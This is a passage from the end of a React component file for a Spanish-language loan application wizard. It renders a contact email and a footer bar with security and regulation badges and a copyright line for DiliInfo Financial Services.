                          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                        </svg>
                        <span>diliads01@outlook.com</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* 底部信任条 */}
        <div className="bg-slate-800 text-white py-4 mt-12">
          <div className="max-w-6xl mx-auto px-4">
            <div className="flex flex-col lg:flex-row items-center justify-between space-y-4 lg:space-y-0">
              <div className="flex items-center space-x-6 text-sm">
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span className="text-slate-300">SSL Seguro</span>
                </div>
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                  <span className="text-slate-300">CNBV Regulado</span>
                </div>
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span className="text-slate-300">Datos Protegidos</span>
                </div>
              </div>
              <div className="text-sm text-slate-400">
                © 2024 DiliInfo Financial Services. Todos los derechos reservados.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanWizard; 